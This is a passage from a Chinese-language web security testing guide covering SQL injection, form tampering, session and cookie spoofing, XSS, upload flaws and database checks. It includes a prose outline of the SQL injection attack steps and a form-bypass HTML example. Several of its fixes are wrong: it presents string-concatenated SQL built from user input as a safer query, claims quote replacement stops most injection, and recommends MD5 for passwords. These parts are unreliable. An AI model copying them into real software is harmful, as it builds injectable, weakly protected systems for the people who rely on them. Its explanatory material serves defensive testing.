系统中危险组件的存在，会给恶意用户留下非常危险的“ 后门”。如恶意用户可利用Windows 系统中存在的FileSystemObject 组件篡改、下载或删除服务器中的任何文件。因此，若系统中需要使用这些组件，可将这些组件更名；否则将其删除。</p>
<p>1.4 TCP 端口测试<br>
开放非必要的端口，会给Web 应用程序带来安全威胁。因此，在布署Web 应用程序前，要用端口扫描软件对布署环境进行TCP 端口测试，禁止UDP，只开启必要的TCP 端口。另<br>
外，在系统运行过程中要不断测试，在服务器端使用lsof 工具(For Unix)或者Inzider 工具(For windows)扫描端口使用情况，必要时从远程使用Nmap 工具进行异常端口占用检测。如果发现有未知的进程占用端口，要关闭端口或杀掉进程。</p>
<p>2 应用程序测试<br>
应用程序中存在的漏洞是影响Web 安全的主要方面，程序员编写的软件都可能有漏洞，有些漏洞可能要经过许多年后才会被发现。特别是不断新加的功能，这些改动，都会带<br>
来安全方面的问题。因此，应用程序测试要伴随着系统开发、布署和运行的全过程。</p>
<p>2.1 SQL 注入漏洞测试<br>
2.1.1 SQL注入漏洞攻击实现原理<br>
SQL（Structured Query Language）是一种用来和数据库交互的语言文本。SQL注入的攻击原理就是攻击者通过Web应用程序利用SQL语句或字符串将非法的数据插入到服务器端数据库中，获取数据库的管理用户权限，然后将数据库管理用户权限提升至操作系统管理用户权限，控制服务器操作系统，获取重要信息及机密文件。<br>
SQL注入利用的是正常的HTTP服务端口，表面上看来和正常的web访问没有区别，隐蔽性极强，不易被发现。<br>
SQL注入过程</p>
<p>如上图所示，SQL注入攻击过程分为五个步骤：<br>
第一步：判断Web环境是否可以SQL注入。如果URL仅是对网页的访问，不存在SQL注入问题，如：http://news.xxx.com.cn/162414739931.shtml就是普通的网页访问。只有对数据库进行动态查询的业务才可能存在SQL注入，如：http://www.google.cn/webhp?id＝39，其中?id＝39表示数据库查询变量，这种语句会在数据库中执行，因此可能会给数据库带来威胁。<br>
第二步：寻找SQL注入点。完成上一步的片断后，就要寻找可利用的注入漏洞，通过输入一些特殊语句，可以根据浏览器返回信息，判断数据库类型，从而构建数据库查询语句找到注入点。<br>
第三步：猜解用户名和密码。数据库中存放的表名、字段名都是有规律可言的。通过构建特殊数据库语句在数据库中依次查找表名、字段名、用户名和密码的长度，以及内容。这个猜测过程可以通过网上大量注入工具快速实现，并借助破解网站轻易破译用户密码。<br>
第四步：寻找WEB管理后台入口。通常WEB后台管理的界面不面向普通用户<br>
开放，要寻找到后台的登陆路径，可以利用扫描工具快速搜索到可能的登陆地址，依次进行尝试，就可以试出管理台的入口地址。<br>
第五步：入侵和破坏。成功登陆后台管理后，接下来就可以任意进行破坏行为，如篡改网页、上传木马、修改、泄漏用户信息等，并进一步入侵数据库服务器。</p>
<p>2.1.2 SQL注入漏洞防范措施<br>
SQL注入漏洞攻击的防范方法有很多种，现阶段总结起来有以下方法：<br>
（1）数据有效性校验<br>
如果一个输入框只可能包括数字，那么要通过校验确保用户输入的都是数字。如果可以接受字母，那就要检查是不是存在不可接受的字符，最好的方法是增加字符复杂度自动验证功能。确保应用程序要检查以下字符：分号、等号、破折号、括号以及SQL关键字。另外限制表单数据输入和查询字符串输入的长度也是一个好方法。如果用户的登录名最多只有10个字符，那么不要认可表单中输入10个以上的字符，这将大大增加攻击者在SQL命令中插入有害代码的难度。<br>
（2）封装数据信息<br>
对客户端提交的数据进行封装，不要将数据直接存入cookie中，方法就是在编程的代码中，插入session、if、try、else，这样可以有效地防止攻击者获取cookie中的重要信息。<br>
（3）去除代码中的敏感信息<br>
将在代码中存在的用户名、口令信息等敏感字段删除，替换成输入框。<br>
如：SQL=&quot; select from users where username = ’admin’and password= ’1234567’ &quot;这样显然会暴露管理员的用户名、口令信息。可以将其修改成SQL= &quot; select * from users where username='&quot; +Txtuser.Text + &quot;' and userpwd='&quot; + Textpwd.Text + &quot;'&quot;，这样就安全了很多，入侵者也是不会轻易的就获取到用户名、口令信息。<br>
（4）替换或删除单引号<br>
使用双引号替换掉所有用户输入的单引号，这个简单的预防措施将在很大程度上预防SQL注入漏洞攻击，单引号时常会无法约束插入数据的Value，可能给予输入者不必要的权限。用双引号替换掉单引号可以使大部分SQL注入漏洞攻击失败。<br>
如：“select* from users where username='&quot; + admin + &quot;' and userpwd='&quot; + 1234567+ &quot;'”显然会得到与“select * from users where username='admin' and password= '1234567'”相同的结果。<br>
（5）指定错误返回页面<br>
攻击者有时从客户端尝试提交有害代码和攻击字符串，根据Web Service给出的错误提示信息来收集程序及服务器的信息，从而获取想得到的资料。应在Web Service中指定一个不包含任何信息的错误提示页面。<br>
（6）限制SQL字符串连接的配置文件<br>
使用SQL变量，因为变量不是可以执行的脚本，即在Web页面中将连接数据库的SQL字符串替换成指定的Value，然后将Web.config文件进行加密，拒绝访问。<br>
（7）设置Web目录的访问权限<br>
将虚拟站点的文件目录禁止游客用户（如：Guest用户等）访问，将User用户权限修改成只读权限，切勿将管理权限的用户添加到访问列表。<br>
（8）最小服务原则<br>
Web服务器应以最小权限进行配置，只提供Web服务，这样可以有效地阻止系统的危险命令，如ftp、cmd、vbscript等。<br>
（9）鉴别信息加密存储<br>
将保存在数据库users表中的用户名、口令信息以密文形式保存，也可以对users表进行加密处理，这样可以大大增加对鉴别信息访问的安全级别。<br>
（10）用户权限分离<br>
应尽可能的禁止或删除数据库中sa权限用户的访问，对不同的数据库划分不同的用户权限，这样不同的用户只能对授权给自己的数据库执行查询、插入、更新、删除操作，就可以防止不同用户对非授权的数据库进行访问。</p>
<p>2.1.3 SQL注入漏洞检测方法<br>
SQL注入漏洞攻击检测分为入侵前的检测和入侵后的检测。入侵前的检测，可以通过手工方式，也可以使用SQL注入漏洞扫描工具软件。检测的目的是为预防SQL注入漏洞攻击，而对于SQL注入漏洞攻击后的检测，主要是针对审计日志的查看，SQL注入漏洞攻击成功后，会在Web Service和数据库的审计日志中留下“痕迹”。检测方法如下：</p>
<p>（1）动态SQL检查<br>
动态的SQL语句是一个进行数据库查询的强大的工具，但把它和用户输入混合在一起就使SQL注入成为了可能。将动态的SQL语句替换成预编译的SQL或者存储过程对大多数应用程序是可行的。预编译的SQL或者存储过程可以将用户的输入作为参数而不是命令来执行，这样就限制了入侵者的行动。当然，它不适用于存储过程中利用用户输入来生成SQL命令的情况。在这种情况下，用户输入的SQL命令仍可能得到执行，数据库仍然存在SQL注入漏洞攻击的危险。</p>
<p>（2）有效性校验<br>
如果一个输入框只可能包括数字，那么要通过验证确保用户输入的都是数字。如果可以接受字母，检查是不是存在不可接受的字符，那就需要设置字符串检查功能。确保应用程序要检查以下字符：分号、等号、破折号、括号以及SQL关键字。</p>
<p>（3）数据表检查<br>
使用SQL注入漏洞攻击工具软件进行SQL注入漏洞攻击后，都会在数据库中生成一些临时表。通过查看数据库中最近新建的表的结构和内容，可以判断是否曾经发生过SQL注入漏洞攻击。</p>
<p>（4）审计日志检查<br>
在Web服务器中如果启用了审计日志功能，则Web Service审计日志会记录访问者的IP地址、访问时间、访问文件等信息，SQL注入漏洞攻击往往会大量访问某一个页面文件（存在SQL注入点的动态网页），审计日志文件会急剧增加，通过查看审计日志文件的大小以及审计日志文件中的内容，可以判断是否发生过SQL注入漏洞攻击事件；另外还可以通过查看数据库审计日志，查询某个时间段是否有非法的插入、修改、删除操作。</p>
<p>（5）其他<br>
SQL注入漏洞攻击成功后，入侵者往往会添加特权用户（如：administrator、root、sa等）、开放非法的远程服务以及安装木马后门程序等，可以通过查看用户帐户列表、远程服务开启情况、系统最近日期产生的一些文件等信息来判断是否发生过入侵。<br>
SQL 注入攻击源于英文“SQL Injection Attack”。微软技术中心从两个方面对SQL 注入攻击进行了描述：一是脚本注入式的攻击；二是恶意用户输入用来影响被执行的SQL脚本。Stephen Kost 对这种攻击形式的描述是“从一个数据库获得未经授权的访问和直接检索”。<br>
SQL 注入就其本质而言，是利用SQL 语法，对应用程序中的漏洞的攻击。当攻击者能够操纵数据，在应用程序中插入一些SQL 语句时，SQL 注入攻击就发生了。理论上，这种攻击对于所有基于SQL 语言标准的数据库软件都是有效的，包括MS SQL Server，Oracle，DB2，Sybase，MySQL等。特别是现在一些AQL 注入攻击工具的出现，使得Web应用更易遭到SQL 注入攻击。原始的手工测试不适用于大型Web 应用程序，可使用N-Stealth、WebInspect、Wikto WebScarab、Nikto 等工具进行扫描，测试系统是否存在SQL 注入的安全漏洞。为防止SQL 注入，程序员编写代码时，要对客户端和服务端进行两级检查。检查数据类型、数据长度和敏感字符的合法性。客户端检查可减少网络流量，降低服务器负荷，将一般误操作、低等级攻击与高等级攻击行为区分开来。对于绕开客户端检查的攻击，提交的数据被直接发往服务端，服务端检查到的提交异常基本可以认定为恶意攻击行为所致，就应中止提交信息的处理，进行攻击备案，并对客户端给出出错或警告提示。另外，在构造查询时，应根据用户输入的内容设置参数值来创建参数化查询，从而避免SQL 注入及由此带来的安全问题。</p>
<p>2.2 表单漏洞测试<br>
2.2.1 表单漏洞实现原理<br>
表单提交是当前Web应用中的重要内容，用户可以通过这种方式与服务器进行数据传递。在通常情况下，会在提交表单之前在服务器上进行表单数据的验证，这样可以节省服务器资源，但同时也为服务器带来了安全漏洞。<br>
表单提交的数据的验证和服务端数据接收的方法直接影响到Web 的安全。随着大量的支持参数的“模糊化”（“fuzzing”）、腐朽（corruption）、以及野蛮强制增长工具的出现，使用非校验输入进行攻击造成的安全问题越来越多。因此，表单漏洞测试是Web 安全所必需的。</p>
<p>2.2.2 表单漏洞防范措施<br>
为防止表单漏洞的攻击，编程时应有一个中心化的、强大的验证机制来对所有HTTP 请求的输入进行验证，过滤可能危及后台数据库的特殊字符、脚本语言和命令。<br>
为防止攻击者绕过客户端的安全机制，对这些字符的检测应在Web 服务端实现，采用清除或者强制替换的方法避免服务器端的安全，并且使用MD5 哈希(hash)函数或者时间戳数字签名技术对客户端敏感数据必须进行完整性保护。<br>
解决这种漏洞的方法为在提交表单页面进行校验的同时，在接收表单的处理页面也进行校验，这样即使用户使用非法方式提交的非法数据通过了页面验证也无法通过服务器上的验证。</p>
<p>2.2.3 表单漏洞检测方法<br>
⑴ 表单数据提交测试。<br>
	对表单数据提交的测试，主要检查程序中是否对表单所提交数据的完整性、正确性进行了验证（如果在页面部分进行验证的话），如：查询条件输入一些特殊字符，比如“--”，“‘，，’”，““”等会使查询的SQL语句出错<br>
	检查程序中是否屏蔽了表单提交的html 语句、VBScript 和Jscript 等客户端脚本语句<br>
	检查是否会出现“脚本利用”问题<br>
	检查程序是否对表单域长度进行了真正的限制<br>
	检查是否存在重复提交数据的问题<br>
	检查这些验证是否在服务器端进行<br>
对表单提交数据的测试，可以采用手工和编写可重复使用的脚本代码相结合的方法，进行边界值测试、等价类测试，以及异常类测试。编写的脚本代码可以在测试、回归测试时运行。<br>
若在测试中发现数据完整性、正确性验证只是在客户端进行，应在服务器端增加对表单提交数据的验证，防止出现本地提交表单的漏洞。<br>
⑵ 本地提交表单的漏洞测试。<br>
本地提交表单的漏洞容易受到参数篡改的攻击。这类测试可用手工的方式进行。<br>
对于如下用户注册页面：</p>
<pre><code>&lt;script&gt;  
function checkUser(){  
if(document.getElementById(&quot;userName&quot;).value==&quot;&quot;){  
document.getElementById(&quot;button&quot;).disabled=true;  
alert(&quot;用户名不可以为空&quot;);  
return false;  
}else{  
document.getElementById(&quot;button&quot;).disabled=false;  
}  
}  
function checkPsw(){  
if(document.getElementById(&quot;password&quot;).value==&quot;&quot;){  
document.getElementById(&quot;button&quot;).disabled=true;  
alert(&quot;密码不可以为空&quot;);  
return false;  
}else{  
document.getElementById(&quot;button&quot;).disabled=false;  
}  
}  
&lt;/script&gt;  
&lt;form action=&quot;regist.php&quot; method=&quot;POST&quot;&gt;  
&lt;input type=&quot;text&quot; name=&quot;userName&quot; onblur=&quot;checkUser()&quot;/&gt;  
&lt;input type=&quot;password&quot; name=&quot;password&quot; onblur=&quot;checkPsw()&quot;/&gt;  
&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;提交&quot;/&gt;  
&lt;/form&gt; 
</code></pre>
<p>此页面中的JavaScript对表单中用户名和密码是否为空进行了判断，如果用户名或密码有一者为空时就会将&quot;提交&quot;按钮设置为不可用，这样可以阻止用户的提交。<br>
但是这个页面的内容可以完全通过查看页面源代码的方式看到，用户可以通过查看源代码的方式将其中的JavaScript部分去掉，同时将表单action请求指向此页面原来的地址，然后将修改后的页面保存为一个静态HTML页面，这样就可以完成一个非法的数据提交。修改之后的页面代码如下：</p>
<pre><code>&lt;form action=&quot;http://www.abcdefg.com/testbug/regist.php&quot; method=&quot;POST&quot;&gt;  
&lt;input type=&quot;text&quot; name=&quot;userName&quot; onblur=&quot;checkUser()&quot;/&gt;  
&lt;input type=&quot;password&quot; name=&quot;password&quot; onblur=&quot;checkPsw()&quot;/&gt;  
&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;提交&quot;/&gt;  
&lt;/form&gt; 
</code></pre>
<p>如此一个页面，完全允许用户提交任何一种数据，包括空的用户名和密码。</p>
<p>2.3 Cookie欺骗漏洞测试</p>
<p>2.3.1 Cookie欺骗实现原理<br>
Cookie最先是由Netscape（网景）公司提出的，Netscape官方文档中对Cookie的定义是这样的：Cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。<br>
Cookie的用途非常广泛，在网络中经常可以见到Cookie的身影。它通常被用来辨别用户身份、进行session跟踪，最典型的应用就是保存用户的账号和密码用来自动登录网站和电子商务网站中的“购物车”。<br>
Cookie注入简单来说就是利用Cookie而发起的注入攻击。从本质上来讲，Cookie注入与传统的SQL注入并无不同，两者都是针对数据库的注入，只是表现形式上略有不同罢了。</p>
<p>2.3.2 Cookie欺骗防范措施<br>
（1）删除Cookie记录<br>
在IE浏览器【工具】【Internet选项】中删除Cookie，也可借助相应安全软件来实现。<br>
（2）更改Cookie文件的保存位置<br>
在【Internet选项】对话框中单击【设置】按钮，在设置页面单击【移动文件夹】出现如下图，在其中设置相应保存位置（如F:\），即可成功更改Cookie文件的保存位置。<br>
（3）添加防注入代码</p>
<p>2.3.3 Cookie欺骗监测方法<br>
如果系统使用了cookie，就要对cookie 的使用情况进行检测。检查Cookies 在生存期内能否正常工作而且对这些信息是否加密，是否按预定的时间进行保存，是否存在cookie 可被伪造提交的问题，刷新对Cookie 有什么影响及过期处理等。</p>
<p>2.4 用户身份验证测试</p>
<p>2.4.1 用户身份验证漏洞防范措施<br>
	限制用户名、密码最大字符数、字符类型<br>
	限制登录次数，超出允许次数后给出友好提示<br>
	限制用户权限<br>
用户身份验证，客户端提交的密码需加密，服务端验证密码使用MD5，若在测试中发现问题，应及时修改代码，使用加密码算法对密码加密。</p>
<p>2.4.2 用户身份验证检测方法<br>
	测试有效和无效的用户名和密码，测试是否大小写敏感，是否有最大字符数的限制规则等。<br>
	测试重试次数的限制，如果登录失败的次数超过允许值，应用程序将会做出何种反应 （譬如拒绝此IP地址在短时间内的登录）。<br>
	测试是否可以利用历史登录信息或以前的URL来绕开登录程序。<br>
	测试执行添加、删除、修改等动作中是否需要登录操作，退出系统之后的操作是否仍可继续等。<br>
	测试用户密码是否符合指定要求（字符、长度），如果不符合，对有什么影响，新用户自己修改密码后，创建时分配的密码是否会失效。<br>
	测试用户账户过期后，是否完全、正确的删除其信息或使其失效。<br>
	是否存在不验证而直接进入Web 应用系统的问题，是否存在不登录就可查看非会员页面和权限问题。<br>
用户身份验证测试一般使用手工和测试工具相结法的方法，若在测试中发现问题，应及时修改代码，使用加密码算法对密码加密，采用Session 对象进行登录验证。</p>
<p>2.5 文件操作漏洞测试</p>
<p>2.5.1 文件操作漏洞实现原理<br>
上存漏洞常见有，文件名检测漏洞，还有就是文件格式检查漏洞。 另外还有一个，就是保存文件存在漏洞。这类漏洞，主要是可以读取用户传入路径名称，采用不正确的过滤方法，导致恶意用户，将文件上存到非预期的地方，带来安全隐患。</p>
<p>2.5.2 文件操作漏洞防范措施<br>
抓住几个地方即可，先来分析下，既然用户要上存文件，而且文件将是多种多样格式；可能有的文件内容与用户传入格式不一致，有的文件内容还夹杂木马代码。 那么，我们让用户上存文件，跟站点文件做一个分别授权，做隔离。<br>
	让保存上存目录独立开来，目录权限只读不能执行<br>
这一步从系统设计加以授权，无论你上次什么文件，都不可能执行到。就算我不做任何检测，你的文件都上存到这里了，也不会对我系统构成安全。（如果有用户上存一些反动言语的图片，那另外需要处理的）<br>
	不直接使用服务器传入值，所有都要进行检测<br>
这类跟我们做一切输入都是有害原则一样，对于客户端传入的：type, name ，都要进行判断，不直接使用。对于要生成到某个目录，某个文件名。<br>
文件名最好方法是：自己写死目录（不要读取传入目录），文件名，最好自己随机生成，不读取用户文件名。文件扩展名，可以取最右边”.”后面字符。<br>
以上2个方法，刚好从2个方面对上存做了整体约束。<br>
方法1：只要保证文件写对了位置，然后从配置上，对写入目录进行权限控制，这个是治本。可以做到，你无论上存什么文件，都让你没有权限跳出去可以运行。<br>
方法2 ： 保存上存文件名，按照自己指定目录写入，并且文件名自己生成的。<br>
以上2个方法，一起使用，可以保证文件正确存到地方，然后，权限可以控制。 这里顺便说明下， 判断用户上存文件是否满足要求类型，就直接检查文件扩展名，只要满足扩展名就让上存。 反正，做了执行权限限制，你不按要求上存内容，也无妨。 反正，不能执行，也不会有多大危害性的。<br>
正确步骤：<br>
1.读取文件名，验证扩展名是不是在范围内<br>
2.自己定义生成的文件名，目录，扩展名可以来自文件名扩展名。 其它值，都自己配置，不读取上存中内容<br>
3.将文件 移到新目录(这个目录权限设置只读)</p>
<p>2.5.3 文件操作漏洞检测方法<br>
	测试系统是否允许上传脚本文件、可执行文件等有可能给系统带来危害的文件。<br>
	若有下载功能，可供下载的文件是否与系统的程序分别存放，是否存在数据库文件、包含文件和页面文件下载的可能。<br>
文件操作漏洞测试一般使用手工测试的方法，若发现问题，应及时修改代码并将可供下载的文件重新布署。</p>
<p>2.6 Session 测试<br>
2.6.1 客户端对服务器端的欺骗攻击</p>
<p>2.6.1.1 攻击原理<br>
在用户访问并登录了某个网站后，该网站的服务器就会给该用户机子上分配一个sessionid，此信息是通过客户机的cookies存放在某一文件夹里面的。session本身并不是长期有效，每一个session在客户端关闭浏览器后sessionid都会自动撤销，但服务端默认保存20分钟。正是有这20分钟的时间，给欺骗带来了可能。 服务器端对不同用户的识别，只能通过sessionid进行，也就是说网站服务器端是“只认id不认人”，只要id符合，就认为是合法用户，所以攻击者只要得到了被攻击对象的sessionid就可以以被攻击对象的身份合法登录，而20分钟的默认保留值，也使得攻击者即使在被攻击对象关闭浏览器后依然有一定的时间成功登录。<br>
当前利用此原理进行攻击的常用手法是利用网站本身的xss漏洞或者是诱骗被攻击者点击相应链接，以使其隐蔽访问攻击者事先假设好的网站并执行恶意代码，获取被攻击者的cookies信息从而得到sessionid。最后用可以修改sessionid的浏览器或其它可以提交数据的工具伪装成被攻击者的id合法登录。</p>
<p>2.6.1.2 防范措施<br>
此类攻击过程较为隐蔽，但也有其局限性。因为session本身有时间限制，特别是用户在关闭浏览器后，留给攻击者的时间也只有20分钟。另外，在触发机制上，盗窃cookies代码的执行必须是用户自己触发，也就是说，用户什么时候触发代码，攻击者是不知道的，从用户触发恶意代码到session失效，攻击者只有很短的时间进行非法活动。<br>
所以，要对此类攻击进行防范，客户端本身应对陌生人给出的超级链接保持警惕，特别是对比较长的超链接更要小心。每次登录网站后应该及时利用网站的退出功能退出和清除本机的cookies。另外登录密码的设置不要过于简单，尽量使用字母与数字组合，密码长度应该在8位以上。网站管理员在开发网站时要注意检查网站的xss漏洞，要注意session有效期的设置，一般不要把有效期设置太长，这样即使真的被攻击也能让其非法活动时间大大缩短。</p>
<p>2.6.2直接对服务器端的欺骗攻击</p>
<p>2.6.2.1 攻击原理<br>
与客户端欺骗不同，此类攻击是对服务器端的直接欺骗。网站开发者在管理员管理页面通常都会有session验证，目的是为了验证当前登录者是否为合法用户。<br>
但如果攻击者能够在登录管理页面前，使用某种手段使得session（”admin”）被赋值（不一定是网站开发者所赋予的值）则验证代码则无法拦截此类非法登录。从而达到了直接欺骗服务器而以管理员身份直接登录的目的。<br>
当前利用此原理进行攻击的常用手法是都是在取得了某网站域名下的某个webshell进行的。如许多免费空间网站都会在主域名下允许用户有自己的二级域名，而此域名的目录又和网站主目录在同一站点下，这样就为欺骗攻击提供了条件。而其它一些网站由于自身的xss等漏洞，使得用户拿下某个webshell，从而也使欺骗攻击成为了可能。在具备了欺骗必备条件后，攻击者还必须知道session验证的源码，从而才能编写恶意代码绕过系统原有的验证。当然，如果验证源码是上文所列的情况，则攻击者只需知道session所用变量即可，因为其并没有给出具体的赋值，只是简单的验证是否为空。攻击者只要赋任意值即可通过此验证。</p>
<p>2.6.2.2 防范措施<br>
此类攻击手法也相当隐蔽，危害极大。因为攻击一旦成功，则攻击者即可以管理员身份非法登录。从此类欺骗攻击的原理我们知道，此攻击要成功必须具备多个先决条件：获得该域名下的一个webshell或者攻击网站与被欺骗网站在同一主站的同一目录下；被攻击主站采取了session验证管理页面；获得被攻击站点的session验证源码；知道被攻击主站的管理页面地址。<br>
所以我们要防范此类攻击，就只能从几个限制条件考虑。网站开发者应该尽量避免各种漏洞，站点在使用前应该经过周密而详尽的测试，从而降低被发现漏洞的可能。对于网站源码不能轻易泄露，特别是在公开场合。如果是使用公开源码假设的网站，更要把源码关键部位更改。本攻击欺骗的关键源码部位即session验证源码。</p>
<p>2.6.3 Session漏洞检测方法<br>
（1）Session互窜<br>
Session互窜即是用户A的操作被用户B执行了。<br>
验证Session互窜，其原理还是基于权限控制，如某笔订单只能是A进行操作，或者只能是A才能看到的页面，但是B的session窜进来却能够获得A的订单详情等。   Session互窜方法：   多TAB浏览器，在两个TAB页中都保留的是用户A的session记录，然后在其中一个TAB页执行退出操作，登陆用户B， 此时两个TAB页都是B的session，然后在另一个A的页面执行操作，查看是否能成功。 预期结果：有权限控制的操作，B不能执行A页面的操作，应该报错，没有权限控制的操作，B执行了A页面 操作后，数据记录是B的而不是A的。<br>
（2）Session超时<br>
基于Session原理，需要验证系统session是否有超时机制，还需要验证session超时后功能是否还能继续走下去。   测试方法：<br>
1、打开一个页面，等着10分钟session超时时间到了，然后对页面进行操作，查看效果。<br>
2、多TAB浏览器，在两个TAB页中都保留的是用户A的session记录，然后在其中一个TAB页执行退出操作，马上在另外一个页面进行要验证的操作，查看是能继续到下一步还是到登录页面。<br>
Session 测试主要检查Web 应用系统是否有超时的限制，也就是检查用户登录后在一定时间内没有点击任何页面，是否需要重新登录才能正常使用，检查超时后能否自动退出，退出之后，浏览器回退按钮是否可以回到登录页面。Session 测试一般使用手工测试和工具测试相结合的方法，若发现问题，应及时修改代码。</p>
<p>2.7 跨网站脚本(XSS)漏洞测试<br>
2.7.1 跨网站脚本（XSS）漏洞实现原理<br>
跨站脚本漏洞（Cross Site Scripting，常简写作XSS）是Web应用程序在将数据输出到网页的时候存在问题，导致攻击者可以将构造的恶意数据显示在页面的漏洞。因为跨站脚本攻击都是向网页内容中写入一段恶意的脚本或者HTML代码，故跨站脚本漏洞也被叫做HTML注入漏洞（HTML Injection）。 与SQL注入攻击数据库服务器的方式不同，跨站脚本漏洞是在客户端发动造成攻击，也就是说，利用跨站脚本漏洞注入的恶意代码是在用户电脑上的浏览器中运行的。</p>
<p>2.7.2 跨网站脚本（XSS）漏洞防范措施<br>
下列规则旨在防止所有发生在应用程序的XSS攻击，虽然这些规则不允许任意向HTML文档放入不可信数据，不过基本上也涵盖了绝大多数常见的情况。你不需要采用所有规则，很多企业可能会发现第一条和第二条就已经足以满足需求了。请根据自己的需求选择规则。<br>
（1）	不要在允许位置插入不可信数据<br>
第一条规则就是拒绝所有数据，不要将不可信数据放入HTML文档，除非是下列定义的插槽。这样做的理由是在理列有解码规则的HTML中有很多奇怪的context，让事情变得很复杂，因此没有理由将不可信数据放在这些context中。<br>
（2）	在向HTML元素内容插入不可信数据前对HTML解码<br>
这条规则适用于当你想把不可信数据直接插入HTML正文某处时，这包括内部正常标签(div、p、b、td等)。大多数网站框架都有HTML解码的方法且能够躲开下列字符。但是，这对于其他HTML context是远远不够的，你需要部署其他规则。<br>
（3）	 在向HTML常见属性插入不可信数据前进行属性解码<br>
这条规则是将不可信数据转化为典型属性值(如宽度、名称、值等)，这不能用于复杂属性(如href、src、style或者其他事件处理程序)。这是及其重要的规则，事件处理器属性(为HTML JavaScript Data Values)必须遵守该规则。</p>
<p>2.7.3 跨网站脚本（XSS）漏洞测试方法<br>
对于呈增长趋势的跨站脚本（XSS）攻击，可使用内嵌检测的方式进行处理。使用WebInspect 工具识别所有的假造参数，使用DevInspect 工具通过特定代码关联在页面上发现安全缺陷，对于显示代码，采用CSE HTML Validator工具进行测试。若在检测中发现系统存在跨站脚本(X SS)漏洞，使用输出数据编码也就是将任何数据返回给用户前均采用HTML 编码，可以有效防止跨站点脚本攻击。因为通过HTML 编码，可将大多数脚本命令自动转换为无害文本。</p>
<p>2.8 命令注射漏洞测试<br>
命令注射漏洞测试主要检查所有调用外部资源(例如system、exec、fork，或者所有的发出请求的语法的源代码，查找那些来自于HTTP 请求的输入可能发起调用的所有地方。使用相同功能的专门的库函数来代替shell 命令和一些系统调用，可以抵御命令注射的攻击，另外一种避免命令注射的保护措施就是确保Web 应用程序只是根据它所要执行某个功能时所需的最小权限来实现这个功能。如果必须使用外部命令的话，任何被插入命令的用户信息必须仔细地审查，设立一定的机制来处理可能出现的错误、超时、或者在调用过程中出现的阻塞。</p>
<p>2.9 日志文件测试<br>
日志文件测试主要检查Web 运行的相关信息是否写进了日志文件、是否可追踪，是否记录了系统运行中发生的所有错误，是否记录了用户的详细信息，包括用户的浏览器、用户停留的时间、用户IP 等。记录了用户的IP，就能通过追捕查出用户的具体地点。错误作为日志保留下来，可供技术人员分析错误是由系统实现漏洞引起的还是由于黑客攻击引起的。</p>
<p>2.10 访问控制策略测试<br>
访问控制策略是网络安全防范和保护的主要策略，其任务是保证网络资源不被非法使用和非法访问。各种网络安全策略必须相互配合才能真正起到保护作用，而访问控制是保证网络安全最重要的核心策略之一。访问控制策略包括入网访问控制策略、操作权限控制策略、目录安全控制策略、属性安全控制策略、网络服务器安全控制策略、网络监测、锁定控制策略和防火墙控制策略等7个方面的内容。</p>
<p>2.10.1 访问控制策略测试方法<br>
	主要检查管理接口是否只有授权的管理员才允许进行访问（对于支持多种管理角色的网站接口往往是内部或者外部攻击者的攻击目标）<br>
	是否有完善的访问控制策略文档（如果该文档不存在的话，这个网站很可能存在着漏洞），文档中是否精确定义了每类用户可以访问的功能和内容<br>
	检查是否只有授权的数据可被访问（如果存在着不同类型或不同组别的数据可以通过接口被访问到）。<br>
主要用于需要验证用户身份以及权限的页面，复制该页面的url地址，关闭该页面以后，查看是否可以直接进入该复制好的地址；<br>
例：从一个页面链到另一个页面的间隙可以看到URL地址，直接输入该地址，可以看到自己没有权限的页面信息；</p>
<p>3 数据库问题测试<br>
在Web 应用中，数据库起着重要的作用，数据库为Web应用系统的管理、运行、查询和实现用户对数据存储的请求等提供空间。因此，Web 应用系统中数据库安全测试是一个重要的方面。与数据库相关的应用级漏洞如SQL 注入和跨站点脚本攻击等问题前面已提及，在此只讨论数据库本身及数据库使用方面的漏洞。</p>
<p>3.1 数据库名称和存放位置安全检测<br>
一个常规的数据库名称，并且存放在与Web 应用程序文件相同或相关的位置，很容易被下载。若在程序代码中包含有数据库名称和数据库文件绝对位置，一旦代码丢失，同样存在暴库的危险。因此，在布署数据库和编写相关的代码时，要避免问题的发生。</p>
<p>3.2 数据库本身的安全检测<br>
对数据库本身的安全检测主要检查数据库是否配置了不同的存取权限，所有操作是否都可以审计追踪，敏感数据是否加密等。为了保证数据库的安全，不同权限的用户定义不同的视图，以限制用户的访问范围；不同的敏感数据采取不同的加密算法，重要的数据分开存储。</p>
<p>3.3 数据使用时的一致性和完整性测试<br>
Web 应用系统中，使用数据库时，可能发生数据的一致性和完整性错误，因此，要检测系统中是否有事务管理和故障恢复功能，确认事务数据是否正确保存，检测系统是否有定期数据备份功能。</p>
<p>4 容错测试<br>
正常操作时，Web 应用程序也总会有错误出现，如内存溢出、空指针异常、系统调用失败、数据库不可用、网络超时等。不当的出错处理可能给网站带来各种各样的安全问题，因此，要对Web 应用程序的错误处理进行测试，以保证为用户提供一份有意义的出错信息，为网站维护人员提供诊断信息，而不是为攻击者提供有用的信息。</p>
<p>4.1 容错方案及方案一致性测试<br>
出错处理应该在整个网站中保持一致性，并且每一个出32错处理片断都应该是一个整体设计方案中的一部分。通过代码检查，测试系统差错处理方案是否合理，方案是否可以处理所有可能发生的错误，方案中是否存在泄漏设计细节的问题，是否存在不同的差错处理方案。</p>
<p>4.2 接口容错测试<br>
检测浏览器与服务器的接口是否正确，中断用户到服务器的网络连接时，系统是否能够正确处理数据；对于有外部接口的Web 系统，如网上商店可能要实时验证信用卡数据以减少欺诈行为的发生，中断Web 服务器到信用卡验证服务器的连接，检测系统是否能够正确处理这些错误，是否对信用卡进行收费。另外，还要测试系统是否能够处理外部服务器返回的所有可能的消息。</p>
<p>4.3 压力测试<br>
压力测试是实际破坏一个Web 应用系统，也就是测试Web应用系统会不会崩溃，在什么情况下会崩溃。黑客常常提供错误的数据负载，直到Web 应用系统崩溃，接着当系统重新<br>
启动时获得存取权。压力测试的区域包括表单、登录和其他信息传输页面，可以采用ab（Apache 的测试工具）和OpenSTA（开发系统测试架构）等相应的工具进行自动化测试。</p>
<h1 id="2021-08-10">2021-08-10</h1>
<p>静态和动态sql语句<br>
所谓的sql的动态的和静态的语句，是指sql语句在何时被编译和执行，二者都是用在sql嵌入式编程中的<br>
